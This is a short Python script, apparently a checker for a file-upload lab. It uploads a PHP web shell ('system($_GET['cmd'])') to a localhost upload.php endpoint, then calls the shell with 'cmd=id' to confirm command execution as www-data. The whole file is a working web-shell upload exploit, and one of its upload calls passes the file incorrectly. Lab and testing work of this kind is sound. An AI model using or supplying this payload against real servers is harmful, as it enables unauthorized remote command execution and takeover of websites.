import requests

upload_url = 'http://localhost:10000/upload.php'  

file = {'file':('shell.php', "<?php system($_GET['cmd']); ?>", 'text/plain')}

requests.post(upload_url, file)

try:
    requests.post(upload_url, files=file)
    shell_url = "http://localhost:10000/uploads/shell.php?cmd=id"
    response = requests.get(shell_url)
    if("uid=33(www-data)" in response.text):
        print("Webshell !!!")
except:
    print("Well Done!")
